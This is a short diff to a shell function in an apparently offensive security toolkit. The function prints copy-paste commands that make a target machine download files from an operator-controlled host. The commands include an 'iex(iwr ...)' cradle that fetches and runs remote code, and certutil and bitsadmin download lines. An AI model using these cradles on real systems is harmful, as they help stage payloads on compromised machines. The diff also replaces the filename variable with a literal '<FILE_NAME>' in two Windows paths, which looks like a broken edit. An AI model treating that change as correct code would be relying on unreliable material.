@@ -86,9 +86,9 @@ nb-srv-file-download() {
     __ask "Choose a command to copy:"
     echo "1.  Invoke-WebRequest https://${__LHOST}:${__LPORT}/$filename -OutFile $filename"
     echo "2.  iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)"
-    echo "3.  certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
+    echo "3.  certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\<FILE_NAME>"
     echo "4.  wget http://${__LHOST}:${__LPORT}/$filename -O $filename"
-    echo "5.  bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Temp\\$filename"
+    echo "5.  bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Temp\<FILE_NAME>"
     echo "6.  Previous menu"
     echo
     echo -n "Choice: "
